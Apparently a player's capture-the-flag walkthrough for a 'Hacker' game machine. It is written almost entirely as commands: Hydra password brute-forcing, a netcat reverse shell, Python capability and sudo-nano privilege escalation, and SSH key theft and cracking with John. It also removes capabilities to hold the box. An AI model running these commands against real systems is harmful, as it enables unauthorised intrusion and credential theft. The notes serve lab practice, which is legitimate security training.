Hacker


**NOTE: This machine resets passwords automatically and are different on every game.**
https://jc01.ninja/ctf/hackers/
## Getting a shell:

- `hydra IP http-post-form '/api/login:username=^USER^&password=^PASS^:Incorrect' -l plague -P /usr/share/wordlists/rockyou.txt -t 64`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4242 >/tmp/f`
- on your machine: `nc -lvnp 4242`
Change to ssh key + login

### Getting root
- `sudo -l`

```
LFILE=file_to_write
echo $USERNAME | openssl enc -out "/root/king.txt"
```

Getting root shell:
- `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

Remove Capability:
- `setcap -r /usr/bin/python3.6`
- `setcap -r /usr/bin/python3.6m`

### Method 2
- `ftp IP` anonymous:anything
	- `passive`
	- `get note`
- brute force ftp credentials using users `hydra ftp://IP -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 64`
- `ftp IP` 
	- `get id_rsa`
- `python3 /usr/share/john/ssh2john.py id_rsa > ssh_hash.txt`
- `john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt`
- `ssh -i id_rsa gcraford@IP`

`sudo nano`

`^R^X`

`reset; sh 1>&0 2>&0`

### Method 3
- `hydra ftp://IP -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64`
- `ssh` in with password